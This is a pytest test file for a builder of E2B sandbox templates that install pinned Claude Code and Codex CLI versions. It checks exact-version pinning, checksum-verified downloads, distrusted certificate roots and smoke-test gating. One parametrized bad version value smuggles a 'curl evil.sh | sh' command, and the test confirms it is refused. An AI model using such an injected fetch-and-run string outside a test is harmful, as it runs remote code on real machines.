"""The template builder: which CLI version a build installs, and when its pin is printed."""

from __future__ import annotations

from types import SimpleNamespace

import pytest

from orchestrator import e2b_template
from orchestrator.e2b_template import VERSION_OVERRIDES, resolve_version, run, smoke_existing
from runtime.adapters.e2b.template import (
    GLAB_VERSION,
    NODE_VERSION,
    definition,
    names_harness,
    template_name,
)

PIN = "claude-2-1-310:0f1e2d3c-0000-4000-8000-000000000001"
CODEX_PIN = "codex-0-164-0:0f1e2d3c-0000-4000-8000-000000000002"
KEYED = {"ANTHROPIC_API_KEY": "sk-ant-test"}
CODEX_KEYED = {"OPENAI_API_KEY": "sk-proj-test"}


def _latest(package: str) -> str:
    return {"@anthropic-ai/claude-code": "2.1.310", "@openai/codex": "0.164.0"}[package]


def test_every_build_skips_the_cache(monkeypatch: pytest.MonkeyPatch) -> None:
    """e2bdev/base is a moving tag and E2B keys its layer cache on the name, so a cached build
    keeps whatever trust store the base had when the layer was first built."""
    from e2b import Template

    calls: list[dict[str, object]] = []

    def build(*args: object, **kwargs: object) -> SimpleNamespace:
        calls.append(kwargs)
        return SimpleNamespace(name="claude-2-1-310", build_id="b")

    monkeypatch.setattr(Template, "build", build)
    assert e2b_template._build("claude", "2.1.310", key="e2b_test") == "claude-2-1-310:b"
    assert calls[0]["skip_cache"] is True


def test_latest_resolves_to_an_exact_version_and_an_override_wins() -> None:
    assert resolve_version("claude", {}, _latest) == "2.1.310"
    assert resolve_version("claude", {"CLAUDE_CLI_VERSION": "2.1.305"}, _latest) == "2.1.305"


@pytest.mark.parametrize("bad", ["latest", "2.1", "2.1.310; curl evil.sh | sh", "2.1.310-RC1"])
def test_a_version_that_is_not_exact_is_refused_before_any_build(bad: str) -> None:
    with pytest.raises(ValueError, match="exact CLI version"):
        resolve_version("claude", {"CLAUDE_CLI_VERSION": bad}, _latest)


@pytest.mark.parametrize(
    ("harness", "version", "floor"),
    [
        ("claude", "2.1.289", "2.1.304"),
        ("claude", "2.1.304-rc.1", "2.1.304"),
        ("codex", "0.159.0", "0.164.0"),
        ("codex", "0.99.9", "0.164.0"),
    ],
)
def test_a_cli_below_its_floor_is_refused(harness: str, version: str, floor: str) -> None:
    with pytest.raises(ValueError, match=floor):
        resolve_version(harness, {VERSION_OVERRIDES[harness]: version}, _latest)


@pytest.mark.parametrize(("harness", "version"), [("claude", "2.1.304"), ("codex", "0.164.0")])
def test_the_floor_itself_is_accepted(harness: str, version: str) -> None:
    assert resolve_version(harness, {VERSION_OVERRIDES[harness]: version}, _latest) == version


def test_an_unversioned_name_is_not_a_harness_build() -> None:
    assert not names_harness("claude", "claude")
    assert names_harness("claude-2-1-310", "claude")
    assert not names_harness("claude-2-1-310", "codex")
    assert names_harness("factorial-claude-2-1-284", "claude")


def test_a_build_fails_while_a_distrusted_root_is_still_trusted() -> None:
    from e2b import Template

    dockerfile = Template.to_dockerfile(definition("claude", "2.1.310"))

    assert "apt-get install -y --no-install-recommends tmux ca-certificates" in dockerfile
    assert "ge 20250419~deb12u2" in dockerfile
    for root in ("emSign ECC Root CA - G3", "AAA Certificate Services"):
        assert root in dockerfile
    assert "ISRG Root X1" in dockerfile and "CN ?= ?" in dockerfile
    node_guard = dockerfile[dockerfile.index("rootCertificates") :].split("\n")[0]
    assert "ISRG Root X1" in node_guard
    for root in ("emSign Root CA - C1", "emSign ECC Root CA - C3"):
        assert root in node_guard
    # The store is checked once the fixed package is in, and Node once it is unpacked.
    assert dockerfile.index("tmux ca-certificates") < dockerfile.index("20250419~deb12u2")
    assert dockerfile.index("tar -xJf") < dockerfile.index("rootCertificates")


def test_a_build_installs_the_exact_version_and_names_it() -> None:
    from e2b import Template

    dockerfile = Template.to_dockerfile(definition("codex", "0.164.0"))

    assert "npm install -g --engine-strict @openai/codex@0.164.0" in dockerfile
    assert f"node-v{NODE_VERSION}-linux-x64.tar.xz" in dockerfile and "sha256sum -c" in dockerfile
    assert dockerfile.index("rm -rf /usr/local/lib/node_modules/npm") < dockerfile.index("tar -xJf")
    assert "apt-get install -y --no-install-recommends tmux" in dockerfile
    assert "DISABLE_AUTOUPDATER=1" in dockerfile
    assert "FACTORIAL_CLI_VERSION=0.164.0" in dockerfile
    assert template_name("codex", "0.164.0") == "codex-0-164-0"


@pytest.mark.parametrize(("harness", "version"), [("claude", "2.1.310"), ("codex", "0.164.0")])
def test_a_build_installs_glab_verified_against_its_release_sums(
    harness: str, version: str
) -> None:
    """The GitLab starter agents open merge requests with glab."""
    from e2b import Template

    dockerfile = Template.to_dockerfile(definition(harness, version))

    release = f"https://gitlab.com/gitlab-org/cli/-/releases/v{GLAB_VERSION}/downloads"
    tarball = f"glab_{GLAB_VERSION}_linux_amd64.tar.gz"
    glab = dockerfile[dockerfile.index(f"{release}/{tarball}") :].split("\n")[0]
    assert f"{release}/checksums.txt" in glab
    assert f"grep ' {tarball}$' checksums.txt | sha256sum -c -" in glab
    assert glab.index("sha256sum -c") < glab.index("tar -xzf")
    assert "/usr/local/bin/glab" in glab
    assert f"""HOME="$home" glab --version | grep -qF '{GLAB_VERSION}'""" in glab
    assert not any("node-v" in line and "glab_" in line for line in dockerfile.splitlines())


class _Builder:
    """The builder's seams, recording what reached E2B."""

    def __init__(
        self, session: list[str] | None = None, uncontained: list[str] | None = None
    ) -> None:
        self.session = session if session is not None else []
        self.uncontained = uncontained if uncontained is not None else []
        self.contained: list[str] = []
        self.smoked: list[str] = []
        self.tagged: list[str] = []

    def build(self, harness: str, version: str) -> str:
        return PIN if harness == "claude" else CODEX_PIN

    async def containment(self, pin: str) -> list[str]:
        self.contained.append(pin)
        return self.uncontained

    async def session_smoke(self, harness: str, pin: str, key: str) -> list[str]:
        self.smoked.append(pin)
        return self.session

    async def record(self, pin: str) -> None:
        self.tagged.append(pin)

    def run(
        self,
        harnesses: list[str] | None = None,
        *,
        env: dict[str, str] = KEYED,
        skip_smoke: bool = False,
    ) -> int:
        return run(
            harnesses or ["claude"],
            env=env,
            skip_smoke=skip_smoke,
            build=self.build,
            containment=self.containment,
            session_smoke=self.session_smoke,
            record=self.record,
            latest=_latest,
        )


def test_a_build_that_passes_both_smokes_prints_its_pin_and_is_tagged(
    capsys: pytest.CaptureFixture[str],
) -> None:
    builder = _Builder()

    assert builder.run() == 0

    assert builder.contained == builder.smoked == builder.tagged == [PIN]
    assert f"claude template: {PIN}  (claude-code 2.1.310, session ok)" in capsys.readouterr().out


@pytest.mark.parametrize(
    ("harness", "pin", "env"), [("claude", PIN, KEYED), ("codex", CODEX_PIN, CODEX_KEYED)]
)
def test_a_failed_session_smoke_fails_the_build_and_prints_no_pin(
    capsys: pytest.CaptureFixture[str], harness: str, pin: str, env: dict[str, str]
) -> None:
    builder = _Builder(session=["no hook fired: trust or hooks are broken"])

    assert builder.run([harness], env=env) == 1

    assert builder.smoked == [pin] and builder.tagged == []
    out = capsys.readouterr().out
    assert f"{harness} template {pin} FAILED; the worker refuses it:" in out
    assert "the session smoke failed: no hook fired" in out
    assert f"{harness} template:" not in out
    assert "HEADLESS ONLY" not in out


def test_containment_runs_first_and_a_failure_skips_the_session_smoke(
    capsys: pytest.CaptureFixture[str],
) -> None:
    """A preview beside a session's credentials depends on the firewall, so the build fails
    closed."""
    builder = _Builder(uncontained=["preview_blocked did not hold"])

    assert builder.run() == 1

    out = capsys.readouterr().out
    assert f"claude template {PIN} FAILED its containment smoke; do not pick it" in out
    assert "preview_blocked did not hold" in out
    assert builder.smoked == [] and builder.tagged == []


def test_a_missing_vendor_key_is_refused_before_anything_builds() -> None:
    builder = _Builder()

    def build(harness: str, version: str) -> str:
        raise AssertionError("built without the key its smoke needs")

    builder.build = build  # type: ignore[method-assign]
    with pytest.raises(SystemExit, match="ANTHROPIC_API_KEY"):
        builder.run(env={})


def test_a_pass_e2b_will_not_record_fails_the_build_and_says_how_to_record_it(
    capsys: pytest.CaptureFixture[str],
) -> None:
    builder = _Builder()

    async def record(pin: str) -> None:
        raise RuntimeError("tags are not available on this plan")

    builder.record = record  # type: ignore[method-assign]

    assert builder.run() == 1
    out = capsys.readouterr().out
    assert "FAILED; the worker refuses it" in out
    assert "tags are not available on this plan" in out
    assert f"--interactive-smoke {PIN}" in out


def test_skipping_the_smoke_prints_a_pin_the_worker_refuses(
    capsys: pytest.CaptureFixture[str],
) -> None:
    builder = _Builder()

    assert builder.run(env={}, skip_smoke=True) == 0

    assert builder.contained == builder.smoked == builder.tagged == []
    assert (
        f"claude template: {PIN}  (claude-code 2.1.310, UNVERIFIED: cannot run until "
        f"--interactive-smoke {PIN})"
    ) in capsys.readouterr().out


def test_the_session_smoke_mode_fails_an_existing_build_that_does_not_pass(
    capsys: pytest.CaptureFixture[str],
) -> None:
    builder = _Builder(session=["the session reported no tokens"])

    status = smoke_existing(
        PIN,
        env=KEYED,
        containment=builder.containment,
        session_smoke=builder.session_smoke,
        record=builder.record,
    )

    assert status == 1 and builder.tagged == []
    out = capsys.readouterr().out
    assert f"claude template {PIN} FAILED; the worker refuses it:" in out
    assert "HEADLESS ONLY" not in out


def test_a_passing_codex_session_smoke_tags_its_build(
    capsys: pytest.CaptureFixture[str],
) -> None:
    builder = _Builder()

    assert builder.run(["codex"], env=CODEX_KEYED) == 0

    assert builder.smoked == [CODEX_PIN] and builder.tagged == [CODEX_PIN]
    assert f"codex template: {CODEX_PIN}  (codex 0.164.0, session ok)" in capsys.readouterr().out


def test_the_session_smoke_mode_tags_an_existing_claude_or_codex_build(
    capsys: pytest.CaptureFixture[str],
) -> None:
    builder = _Builder()

    for pin, env in ((PIN, KEYED), (CODEX_PIN, CODEX_KEYED)):
        status = smoke_existing(
            pin,
            env=env,
            containment=builder.containment,
            session_smoke=builder.session_smoke,
            record=builder.record,
        )
        assert status == 0

    assert builder.contained == builder.smoked == builder.tagged == [PIN, CODEX_PIN]
    with pytest.raises(SystemExit, match="OPENAI_API_KEY"):
        smoke_existing(
            CODEX_PIN,
            env=KEYED,
            containment=builder.containment,
            session_smoke=builder.session_smoke,
            record=builder.record,
        )


def test_the_session_smoke_mode_tags_nothing_whose_containment_fails(
    capsys: pytest.CaptureFixture[str],
) -> None:
    """A `--skip-smoke` build ran no containment smoke: the tag must not skip it too."""
    builder = _Builder(uncontained=["preview_blocked did not hold"])

    status = smoke_existing(
        PIN,
        env=KEYED,
        containment=builder.containment,
        session_smoke=builder.session_smoke,
        record=builder.record,
    )

    assert status == 1
    assert builder.contained == [PIN] and builder.smoked == builder.tagged == []
    assert f"claude template {PIN} FAILED its containment smoke" in capsys.readouterr().out
